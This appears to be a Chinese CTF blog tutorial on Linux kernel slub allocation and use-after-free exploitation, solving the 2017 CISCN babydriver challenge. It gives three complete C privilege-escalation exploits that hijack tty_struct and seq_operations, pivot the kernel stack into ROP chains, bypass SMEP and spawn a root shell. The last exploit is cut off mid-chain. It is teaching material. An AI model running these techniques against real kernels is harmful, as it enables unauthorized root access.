---
layout: post
title: 0x02. Linux kernel基础：Kernel UAF
category: system/kernel
date: 2024-7-20 14:00:00
---
我的fastbin呢？
<!-- more -->
[toc]

# Linux Kernel UAF漫谈

## 0x00. Linux Kernel中的内存管理

### 内存管理的数据结构

`Linux Kernel`下的内存管理系统分为`Buddy System`（伙伴系统）和`slub allocator`，而笔者对于`buddy system`的理解有点类似于用户态下通过`mmap`来分配的、更大的内存。而`slub allocator`即管理更小的、零散的内存。

首先来看`slub allocator`的组成。笔者看到`slub allocator`的示意图后，初见觉得非常复杂，而细看后，更复杂了。但从`Linux kernel pwn`的角度来看，其实并不需要到熟读源码和细致的结构体的程度（初学阶段）。

与用户态的`chunk`对应的（只是类似，并不是完全对应），`kernel`中有一个结构体叫做`object`。它即为`slub allocator`分配的基本单元。而与用户态对应的`bins`分为两种，一个叫做`kmem_cache_cpu`，而另一种叫做`kmem_cache_node`，它们将管理我们提到的`object`。

简要介绍一下`kmem_cache_cpu`。`kmem_cache_cpu`是一个**`percpu`变量**（这意味着，每个`CPU`上都独立有一份`kmem_cache_cpu`的副本，通过`gs`寄存器作为`percpu`基址进行寻址），表示当前`CPU`使用的`slub`，直接从当前`CPU`来存取`object`，不需要加锁，能够提高性能。然而这对于我们在`Linux Kernel Pwn`中，只会成为负担，毕竟我们并不希望额外考虑当前正在使用哪个`CPU`~。因此，我们在利用前，可以将我们的程序绑定到某个`CPU`上，即可无视掉这条规则。

而对于`kmem_cache_node`，它包括两个链表，其中一个叫做`partial`，另一个叫做`full`。顾名思义，`partial`链表中，存在部分空闲的`object`；而`full`链表中，全部`object`都已经被分配了。

### 分配过程

首先，`slub allocator`从`kmem_cache_cpu`上取`object`，若`kmem_cache_cpu`上存在，则直接返回；

若`kmem_cache_cpu`上的`slub`无空闲对象了，那么该`slub`会被加入到`kmem_cache_node`中的`full`链表，并从`partial`链表中取一个`slub`挂载到`kmem_cache_cpu`上，然后重复第一步的操作，取出`object`并返回。

若`kmem_cache_cpu`的`partial`链表也空了，那么会向`buddy system`请求分配新的内存页，划分为多个`object`，并给到`kmem_cache_cpu`，取出`object`并返回。

### 释放过程

释放过程需要看被释放的`object`属于的`slub`现在位于哪里。

若其`slub`现在位于`kmem_cache_cpu`，则直接头插法插入当前`kmem_cache_cpu`的`freelist`链表。

若其`slub`属于`kmem_cache_node`的`partial`链表上的`slub`，则同样通过头插法插入对应的`slub`中的`freelist`。

若其`slub`属于`kmem_cache_node`的`full`链表上的`slub`，则会使其成为对应`slub`的`freelist`的头结点，并将该`slub`从`full`链表迁移到`partial`。

## 0x01. 分配细节

### 基于大小分配

对于`slub allocator`，其分配类似于用户态下`unsortedbin`的切割，而不是`fastbin`或者`tcache`。

`slub allocator`中的`kmem_cache`存在多种不同大小，每一种都对应一种特定大小的对象，且均为`2`的幂次方，例如`8`字节、`16`字节、`256`字节、`0x100`字节、`0x200`字节、`0x400`字节.....等等。在分配时，其会选择一个大于其大小的`2`的幂次方的值。

例如，`tty_struct`的大小为`0x2b8`，为了能够满足其大小，其会使用`kmalloc-1024`这样的`kmem_cache`。

此外，为了减少内存碎片，还有一些特殊大小的`slub`，例如`96`字节和`192`字节。

### kmalloc flag的隔离机制

在`Linux Kernel`中，并不是所有内存分配都基于上面的描述，例如`kmalloc`还存在一个`flag`机制，其包括两种，一个叫做`GFP_KERNEL`，另一个叫做`GFP_KERNEL_ACCOUNT`。其中，与用户空间的数据相关联的对象会有`GFP_KERNEL_ACCOUNT`这样的`flag`，而与用户空间数据不直接相关的`flag`为`GFP_KERNEL`。

在`Linux kernel`的版本位于`5.9`之前，或者`5.14`及以后时，这两个`flag`的`object`存在隔离机制。即，这些`object`会完全位于独立、不同的`slub`中，如下所示：（图来自于`arttnba3`师傅）

![image.png](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161557508.png)

如上所示，只要对于开启了`CONFIG_MEMCG_KMEM`编译选项的`kernel`，其会为使用`GFP_KERNEL_ACCOUNT`进行分配的通用对象创建一组独立的`kmem_cache`，即图中带有`cg`字样的`kmalloc`。

### kmalloc flag: SLAB_ACCOUNT

`SLAB_ACCOUNT`同样是一种`flag`。对于某些特殊的`slub`，例如`cred_jar`是一个专门用于分配`cred`结构体的`kmem_cache`，但由于其大小也属于`kmalloc-192`，因此`cred`结构体和其他属于`192`大小的`object`都会从同一个`kmem_cache`，即`kmalloc-192`中分配。

而新版内核中，`cred_jar`被添加了`SLAB_ACCOUNT`，这意味着`cred_jar`与`kmalloc-192`现在相互隔离，为两个不同的`slub`。

这带来的最大的影响就是，我们无法直接使用`UAF`直接申请回某些带有`SLAB_ACCOUNT`的`flag`的`object`，例如申请回控制`uid`的`cred`结构体。

## 0x02. 初探Kernel UAF：2017-CISCN-babydriver

### 题目详情

首先查看题目启动脚本：

```bash
#!/bin/bash

qemu-system-x86_64 \
    -initrd core.cpio \
	-kernel bzImage \
	-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
    -enable-kvm \
	-monitor /dev/null \
	-m 128M \
	--nographic  \
	-smp cores=1,threads=1 \
	-cpu kvm64,+smep \
	-s
```

可以看到，其开启了`smep`，这意味着要使用`ret2usr`的话，至少需要控制`cr4`的值为`0x6f0`。

没有开启`kaslr`，这意味着我们可以直接通过`vmlinux`来提取`gadgets`的地址。

再看`rcS`启动脚本：

```bash
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

能看到题目挂载的驱动叫做`/dev/baby`。

没有设置`dmesg_restrict`，这意味着我们可以通过`dmseg`查看内核`printk`的输出。

没有设置`kptr_restict`，这意味着普通用户可以通过`cat /proc/kallsyms`查看所有内核函数的地址。

程序的逻辑很简单，类似于菜单堆，含有一个全局变量`babydev_struct`。

`open`函数会初始化该结构体：

![QQ_1721118134849](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161622785.png)

`ioctl`函数可以通过`kmalloc`重新分配设置大小：

![QQ_1721118209318](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161623702.png)

`release`中会通过`kfree`释放`object`，但**没有置空，存在`UAF`：**

![QQ_1721118222712](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161624219.png)

而`write`函数和`read`函数即为常规的填写和读内容，不再赘述。

此外，由于`babydev_struct`结构体是一个全局变量，因此若我们通过`open`来打开`/dev/babydev`两次，其`fd`会指向同一个`babydev_struct`，相信你能理解。

### 解题思路总览

本题中白给了一个`UAF`，这意味着我们可以通过释放一个`object`，再让内核中的某个结构体使用这个`object`，便可以达到任意写这个`object`的目的。这也就是我们`kernel pwn`的`UAF`中的常见利用方式。

因此，结构体的选择便是一个有趣的问题，根据结构体的不同，我们有不同的解题方案来选择。

### 解题思路1：tty_struct + 栈迁移（kmalloc-1k，GFP_KERNEL_ACCOUNT）

在`/dev`下存在一个伪终端设备`ptmx`，打开该设备时内核会创建一个`tty_struct`结构体，与其他类型的设备相同，`tty`驱动设备也含有一个存放函数指针的结构体`tty_operations`。因此，我们可以利用`UAF`来劫持`tty_struct`结构体，并劫持`tty_operations`中的函数指针。

而难点在于，`kernel`中是不存在类似于用户态中的`one_gadget`这样直接拿到权限的函数的。这意味着我们至少需要通过栈迁移，来完成`ROP`才可以执行`commit_creds(prepare_kernel_cred(NULL))`。

调试观察寄存器状态，在我们劫持`tty_operations`并调用其中的函数指针时，`RAX`寄存器的值恰好为`tty_operations`结构体的地址。因此，我们可以设置劫持`tty_operations`表中的所有函数指针为`mov rsp, rax; ret`这样的`gadget`，便可以将`rsp`劫持到该结构体起始位置。而即使这样，`rop`的空间也比较小，因此我们将`tty_operations`函数表中的起始位置改为`pop rsp; ret`这样的`gadget`，再在`tty_operations[1]`中写一个`rop`链的地址，即可完成再一次栈迁移到我们编写的`rop`链~

需要注意的是，`ropper`和`ROPgadget`需要配合使用。例如，对于`mov rsp, rax; dec ebx; ret`这样的`gadget`，`ropper`无法找到：

![QQ_1721120202698](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161656851.png)

而`Ropgadget`可以找到：

![QQ_1721120224917](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202407161657236.png)

经过调试，第一条`jmp`的位置实际上就是`ret`。因此，需要配合查找`gadget`。

`exp`如下：（`main`函数中有详细注释）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdarg.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");
}

void get_root_privilige(){
    void* (*prepare_kernel_cred_ptr)(void*) = prepare_kernel_cred;
    void* (*commit_creds_ptr)(void*) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

int main()
{
    info("Starting to exploit...");
    
    // 保存当前寄存器状态 
    save_status();

    // 通过kallsyms，可以查看所有函数的地址（未设置kptr_restrict）
    FILE *sym_fd = fopen("/proc/kallsyms", "r");
    if (sym_fd < 0)
    {
        error("Open /proc/kallsyms Failed.");
        exit(0);
    }

    // 写循环，查找所需函数prepare_kernel_cred和commit_creds的地址
    size_t address = 0;
    char type[2];
    char func[0x50];
    while(fscanf(sym_fd, "%llx%s%s", &address, type, func)){
        // info("The function name is %s, while address is 0x%lx.", func, address);
        if(commit_creds && prepare_kernel_cred){
            success("The address of functions are all found.");
            break;
        }
        if(!strcmp(func, "prepare_kernel_cred")){
            prepare_kernel_cred = address;
        }
        if(!strcmp(func, "commit_creds")){
            commit_creds = address;
        }
    }
    if(!commit_creds || !prepare_kernel_cred){
        error("Failed to get the function address.");
    }

    success("The address of prepare_kernel_cred is 0x%llx.", prepare_kernel_cred);
    success("The address of commit_creds is 0x%llx.", commit_creds);


    // 先编写好需要使用的ROP链
    size_t rop[0x20], p = 0;
    // 设置cr4寄存器的值为0x6f0，绕过smep和smap
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    // ret2usr，执行commit_creds(prepare_kernel_cred(NULL));
    rop[p++] = (size_t)get_root_privilige;
    // 通过swapgs、iretq来回到用户态
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    // 创建一个shell，恢复保存的状态
    rop[p++] = get_root_shell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    // 我们写fake_operations函数指针表中的所有函数都为MOV_RSP_RAX_DEC_EBX_RET
    size_t fake_op[0x30];
    for(int i=0;i<0x30;i++){
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;
    }

    // 执行到上述MOV_RSP_RAX_DEC_EBX_RET后，会栈迁移到fake_operations结构体起始位置
    // 在起始位置布置pop rax; ret的gadget，配合后面的MOV_RSP_RAX_DEC_EBX_RET来再次栈迁移到rop链
    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;


    // 漏洞利用的核心
    // 打开该驱动两次，获得fd1和fd2
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 调整其大小为0x2e0，如此其会属于kmalloc-1024
    ioctl(fd1, 0x10001, 0x2e0);
    // 释放object到kmalloc-1024，但fd2仍然可以访问
    close(fd1);


    size_t fake_tty[0x20];
    // 打开/dev/ptmx，其tty_struct结构体的内存会从kmalloc-1024中申请，因此fd2可以控制这块内存
    int fd3 = open("/dev/ptmx", 2);

    // 将tty_struct结构体的数据读到fake_tty中，防止修改到不该修改的值
    read(fd2, fake_tty, 0x40);

    // 将fake_tty的tty_operations函数指针表设置为我们伪造的函数指针表
    fake_tty[3] = fake_op;

    // 重新写入tty_struct结构体
    write(fd2, fake_tty, 0x40);

    // 我们已经劫持了tty_struct的函数指针，调用tty_struct函数指针中的write来触发整个流程
    write(fd3, func, 0x8); 
    return 0;
}
```

### 解题思路2：tty_struct + work_for_cpu_fn

上一种解题思路中，我们劫持了`tty_struct`，随后进行了两次栈迁移来打`rop`，而且需要绕过`smep`等保护措施。这样做比较麻烦，因此我们来看一种简单一点的方法，即利用`work_for_cpu_fn`函数。

该函数在开启了多核支持的内核中都有这个函数，其定义如下：

```c
struct work_for_cpu {
    struct work_struct work;
    long (*fn)(void *);
    void *arg;
    long ret;
};
 
static void work_for_cpu_fn(struct work_struct *work)
{
    struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
 
    wfc->ret = wfc->fn(wfc->arg);
}
```

因此该函数可以简单理解为如下形式：

```c
static void work_for_cpu_fn(size_t * args)
{
    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));
}
```

查看函数表：

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    unsigned int (*write_room)(struct tty_struct *tty);
    unsigned int (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
......
```

可以得知，这些函数表中的第一个参数均为`tty_struct`本身。

因此，若我们将`tty_struct`劫持为如下形式：

```c
tty_struct[4] = (size_t)commit_creds;
tty_struct[5] = (size_t)init_cred;
```

将函数表中的函数覆盖为`work_for_cpu_fn`，即可执行：

```c
((void*)tty_struct[4])(tty_struct[5]);
```

即：

```c
commit_creds(&init_cred);
```

需要注意的是，这里劫持函数表`tty_operations`中的`ioctl`而不是`write`函数。原因比较复杂，此处不再赘述。

需要注意的是，执行`commit_cred(&init_cred)`后，我们还原`tty_struct`结构体中的内容即可。

这种解法的`exp`如下（`main`函数中有详细注释）：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdarg.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

size_t commit_creds = 0, prepare_kernel_cred = 0, work_for_cpu_fn = 0, init_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");
}

void get_root_privilige(){
    void* (*prepare_kernel_cred_ptr)(void*) = prepare_kernel_cred;
    void* (*commit_creds_ptr)(void*) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main()
{
    info("Starting to exploit...");
    
    // 保存当前寄存器状态 
    save_status();

    // 通过kallsyms，可以查看所有函数的地址（未设置kptr_restrict）
    FILE *sym_fd = fopen("/proc/kallsyms", "r");
    if (sym_fd < 0)
    {
        error("Open /proc/kallsyms Failed.");
        exit(0);
    }

    // 写循环，查找所需函数prepare_kernel_cred和commit_creds的地址
    // 在本方法中，还需要找到work_for_cpu_fn函数和init_cred变量的地址
    size_t address = 0;
    char type[2];
    char func[0x50];
    while(fscanf(sym_fd, "%llx%s%s", &address, type, func)){
        // info("The function name is %s, while address is 0x%lx.", func, address);
        if(commit_creds && prepare_kernel_cred && work_for_cpu_fn && init_cred){
            success("The address of functions are all found.");
            break;
        }
        if(!strcmp(func, "prepare_kernel_cred")){
            prepare_kernel_cred = address;
        }
        if(!strcmp(func, "commit_creds")){
            commit_creds = address;
        }
        if(!strcmp(func, "work_for_cpu_fn")){
            work_for_cpu_fn = address;
        }
        if(!strcmp(func, "init_cred")){
            init_cred = address;
        }
    }
    if(!commit_creds || !prepare_kernel_cred || !work_for_cpu_fn || !init_cred){
        error("Failed to get the function address.");
    }

    success("The address of prepare_kernel_cred is 0x%llx.", prepare_kernel_cred);
    success("The address of commit_creds is 0x%llx.", commit_creds);
    success("The address of work_for_cpu_fn is 0x%llx.", work_for_cpu_fn);
    success("The address of init_cred is 0x%llx.", init_cred);

    size_t buf[0x50];
    size_t fake_tty[0x50];
    size_t fake_ope[0x50];
    size_t origin_tty[0x2d0];

    // 打开题目文件两次
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 通过ioctl来改变babydev_struct的object大小
    ioctl(fd2, 0x10001, 0x2e0);

    // 释放fd1，而由于UAF，fd2仍然可以写其内容
    close(fd1);

    // 通过/dev/ptmx来打开tty_struct
    // 由于UAF，可以通过fd2来控制这个tty_struct
    info("opening tty_struct...");
    int fd3 = open("/dev/ptmx", 2);

    // 将原始的tty_struct内容读入origin_tty和fake_tty
    // 前者是我们希望在最后来恢复整个tty_struct
    // 后者是我们读入fake_tty，保证在修改tty_struct的时候不修改到其他变量
    read(fd2, origin_tty, 0x2d0);
    read(fd2, fake_tty, 0x40);
    
    // fake_tty的tty_operations指向我们写得fake_operations
    fake_tty[3] = fake_ope;

    // 将tty_operations的ioctl改为work_for_cpu_fn函数
    info("changing the tty_operations...");
    fake_ope[12] = (size_t)work_for_cpu_fn;

    // work_for_cpu_fn函数会执行(*(void*))tty_struct[4])(tty_struct[5])
    fake_tty[4] = (size_t)commit_creds;
    fake_tty[5] = (size_t)init_cred; // 因此这里是init_cred而不是prepare_kernel_cred哦
    
    // 将写好的fake_tty重新写入tty_struct
    info("writing changed tty_struct...");
    write(fd2, fake_tty, 0x40);

    // 通过fake_operations中的ioctl来触发commit_creds(&init_cred);
    // 需要注意的是ioctl在执行前还有一些操作，因此ioctl的参数写为两个233
    // 好吧，如你所见，我改成0xdeadbeaf也可以
    info("exploiting ioctl...");
    ioctl(fd3, 0xdeadbeaf, 0xdeadbeaf);

    // 还原tty_struct
    info("fix the tty_struct...");
    write(fd2, origin_tty, 0x2d0);
    close(fd3);

    // 由于前面已经commit_creds(&init_cred)了，因此直接返回用户态起一个shell~
    get_root_shell();
}
```

### 解题思路3：seq_file（kmalloc-32, GFP_KERNEL_ACCOUNT）+ pt_regs

`seq_file`叫做序列文件接口`Sequence File Intreface`，其结构体如下：

```c
struct seq_file {
    char *buf;
    size_t size;
    size_t from;
    size_t count;
    size_t pad_until;
    loff_t index;
    loff_t read_pos;
    struct mutex lock;
    const struct seq_operations *op;
    int poll_event;
    const struct file *file;
    void *private;
};
```

而实际上，`seq_file`这个结构体我们是无法打开来申请内存空间的。但我们可以**通过`open("/proc/self/stat")`，来打开并申请`seq_operation`这个结构体**，也就是上面写的`seq_file`的函数指针表，其数据结构如下所示：

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

可以看到，其中只含有四个函数指针。我们在申请到该结构体时，可以直接**读取其中的`start`函数，其实际上是内核函数`single_start`的地址**。由此可以泄露内核基地址。

而利用方式也很简单，只需要**对该结构体使用`read`，其就会调用`seq_operation->start`**。因此只要覆盖`start`函数指针，即可完成程序控制流劫持。但注意，该函数的参数是无法控制的，因此我们通常会选取其它数据结构一起，例如`pt_regs`配合`rop`。

**总结该结构体的利用方式：**

- 通过`open("/proc/self/stat")`来分配`seq_operation`结构体，`kmalloc-32, GFP_KERNEL_ACCOUNT`

- 通过读取`start`函数地址来获取到`single_start`函数地址，从而泄露内核基地址
- 通过覆盖`start`函数来劫持程序控制流，无法控制参数，通常配合`pt_regs`等其它数据结构

那么回到本题，我们可以利用`UAF`写`seq_operation`结构体，覆盖`start`函数指针为一个`add_rsp_xxx_ret`类似的`gadget`，使其调用该函数时，`rsp`能位于`pt_regs`结构体的位置。这里有两点需要阐明和注意：

什么是`pt_regs`结构体？简单来说，就是用户态的寄存器在进入内核态的时候仍然会保留在栈底，因此若我们进入内核态前提前控制了这些寄存器的值，那么便可以在内核栈底留下一些可控数据。例如，我们可以用这些数据来实现`rop`。

因此，通过`seq_file`来利用`pt_regs`结构体的一个`shellcode`板子如下：

```c
__asm__(
       "mov r15,   0xbeefdead;"
       "mov r14,   0x11111111;"
       "mov r13,   0x22222222;"
       "mov r12,   0x33333333;"
       "mov rbp,   0x44444444;"
       "mov rbx,   0x55555555;"
       "mov r11,   0x66666666;"
       "mov r10,   0x77777777;"
       "mov r9,    0x88888888;"
       "mov r8,    0x99999999;"
       "xor rax,   rax;"
       "mov rcx,   0xaaaaaaaa;"
       "mov rdx,   8;"
       "mov rsi,   rsp;"
       "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
       "syscall"
);
```

上面我们直接使用汇编写了`read(seq_fd, rsp, 8)`这样来调用`seq_operation->start`。这是推荐的做法。笔者曾经有一次打算写`C`语言的`read`，而`rbp`又被我们改了，就导致奇怪的报错。

另外一点，找到`add rsp, xxxx`这样的`gadget`比较困难，有的`gadget`无法通过`ropper`或者是`ROPgadget`找到，而`pwntools`却可以找到这样的`gadget`。例如，本题中存在这样一个`gadget`：

```assembly
   0xffffffff812743a5:  add    rsp,0x120
   0xffffffff812743ac:  pop    rbx
   0xffffffff812743ad:  pop    r12
   0xffffffff812743af:  pop    r13
   0xffffffff812743b1:  pop    r14
   0xffffffff812743b3:  pop    r15
   0xffffffff812743b5:  pop    rbp
   0xffffffff812743b6:  ret
```

加起来刚好是`0x148`。而我们在使用`seq_operations->start`来试图将`rsp`抬到`pt_regs`时，刚好需要将`rsp`加上`0x148`。除了这一条`gadget`，其它`ropper`和`ROPgadget`都无法找到这样的`gadget`。而这条`gadget`又无法通过这俩找到。`pwntools`可以找到，但在知道这样一个`gadget`之前，如何知道这个`gadget`是这个样子呢？（悲）

这里问了`t1d`师傅和`lotus`师傅（还得是`t1d & lotus`），可以通过`pwntools`写正则找，或者简单的方式，由于偏移我们能算出来是`0x148`，因此可以在一个小范围内手动`check`一下。例如需要`0x148`，那就大不了从`0x110`开始慢慢找？不失为一种解决方案（笑）。

随后该种方法的`exp`如下，仍然是可以通过`main`函数中的注释来理解该方法：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdarg.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef
#define ADD_RSP_0x150_RET 0xffffffff812743a5
#define ADD_RSP_0X48_RET 0xffffffff8111fd8e
#define POP_RSP_RET 0xffffffff81171045

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

size_t commit_creds = 0, prepare_kernel_cred = 0, work_for_cpu_fn = 0, init_cred = 0;

int seq_fd = 0;
size_t user_cs, user_ss, user_rflags, user_sp;

size_t pop_rdi_ret = POP_RDI_RET;
size_t mov_cr4_rdi_pop_rbp_ret = MOV_CR4_RDI_POP_RBP_RET;
size_t add_rsp_0x48_ret = ADD_RSP_0X48_RET;
size_t pop_rsp_ret = POP_RSP_RET;

size_t rop[0x200] = {0, };
size_t function = (size_t)&rop[0];

void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");
}

void get_root_privilige()
{
    void *(*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    void *(*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void baby_ioctl(int lfd, size_t len)
{
    ioctl(lfd, 0x10001, len);
}

int main()
{
    info("Starting to exploit...");

    // 保存当前寄存器状态
    save_status();

    // 通过kallsyms，可以查看所有函数的地址（未设置kptr_restrict）
    FILE *sym_fd = fopen("/proc/kallsyms", "r");
    if (sym_fd < 0)
    {
        error("Open /proc/kallsyms Failed.");
        exit(0);
    }

    // 写循环，查找所需函数prepare_kernel_cred和commit_creds的地址
    size_t address = 0;
    char type[2];
    char func[0x50];
    while (fscanf(sym_fd, "%llx%s%s", &address, type, func))
    {
        // info("The function name is %s, while address is 0x%lx.", func, address);
        if (commit_creds && prepare_kernel_cred && init_cred)
        {
            success("The address of functions are all found.");
            break;
        }
        if (!strcmp(func, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = address;
        }
        if (!strcmp(func, "commit_creds"))
        {
            commit_creds = address;
        }
        if (!strcmp(func, "init_cred"))
        {
            init_cred = address;
        }
    }
    if (!commit_creds || !prepare_kernel_cred || !work_for_cpu_fn || !init_cred)
    {
        error("Failed to get the function address.");
    }

    success("The address of prepare_kernel_cred is 0x%llx.", prepare_kernel_cred);
    success("The address of commit_creds is 0x%llx.", commit_creds);
    success("The address of init_cred is 0x%llx.", init_cred);

    size_t buf[0x300] = {0, };
    size_t fake_tty[0x50];
    size_t fake_ope[0x50];
    size_t origin_tty[0x2d0];

    // 打开题目驱动两次
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 由于seq_operation属于kmalloc-32，因此更改其大小为0x20
    ioctl(fd1, 0x10001, 0x20);

    // 释放fd1和fd2指向的这块内存，但由于UAF，fd2仍然可以对其访问
    close(fd1);

    // 通过打开/proc/self/stat来获得一个seq_operation函数表结构体
    seq_fd = open("/proc/self/stat", O_RDONLY);

    // 从seq_operations中读入几个函数的地址，必要时可以进行泄露基地址。
    // 本题没有打开kaslr，因此不太需要泄露基地址
    read(fd2, buf, 0x18);
    success("The address of function in seq_operations is 0x%llx.", buf[0]);

    // 将读入的第一个函数指针start修改为add_rsp_0x150_ret这样的gadget，使其调用时抬栈到pt_regs
    buf[0] = ADD_RSP_0x150_RET;
    // 将修改后的函数表写回seq_operations
    write(fd2, buf, 8);

    // 布置好rop链，待会通过seq_operation迁移到这里来
    int p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = init_cred;
    rop[p++] = commit_creds;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0xdeadbeaf;
    rop[p++] = IRETQ_RET;
    rop[p++] = get_root_shell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
